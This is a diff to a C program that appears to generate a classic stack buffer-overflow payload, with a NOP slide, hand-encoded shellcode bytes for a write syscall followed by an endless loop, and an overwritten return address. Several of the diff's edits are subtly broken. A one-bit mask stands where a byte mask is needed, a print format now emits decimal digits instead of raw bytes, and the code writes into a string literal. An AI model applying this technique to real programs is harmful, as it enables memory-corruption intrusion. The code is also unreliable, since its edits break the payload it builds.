@@ -11,6 +11,9 @@
 // length of NOP slide, see phrack 49
 #define SLIDE_LEN 16
 
+// least significant bit
+ #define LSB_MASK 0x01
+
 // -1 will be replaced with the \0
 // -2 will be replaced with the buffer start location
 char * instructions =
@@ -21,6 +24,7 @@ char * instructions =
 "0x48    0xc7    0xc2    0x01    -1    -1    -1 "
 "0xcd    0x80 "
 "0xeb    0xfe ";
+
 /*
  mov $4, %rax 					// syscall 4 = write
  mov $1, %rbx 					// file desc 1 = stdout
@@ -70,13 +74,13 @@ int main(int argc, char * const argv[]) {
     while (token != NULL) {
     	long base10 = strtol(token, NULL, 10);
         if (base10 == -1) {
-            instrs[numChars++] = '\0';
+            instructions[numChars++] = '\0';
         } else if (base10 == -2) {
         	long ret_addr_copy = new_ret_addr;
             int i;
             for (i = 0; i < sizeof(int); i++) {
             	// mask off upper bytes
-                instrs[numChars++] = (char) ret_addr_copy;
+                instructions[numChars++] = (char) ret_addr_copy;
                 // shift bytes to the right
                 ret_addr_copy >>= 8;
             }
@@ -110,7 +114,7 @@ int main(int argc, char * const argv[]) {
 
     // print new_ret_addr bytes starting from LSB
     for (i = 0; i < sizeof(long); i++) {
-        printf("%c", (new_ret_addr & LSB_MASK));
+        printf("%lu", (new_ret_addr & LSB_MASK));
         new_ret_addr = new_ret_addr >> 8;
     }
 }
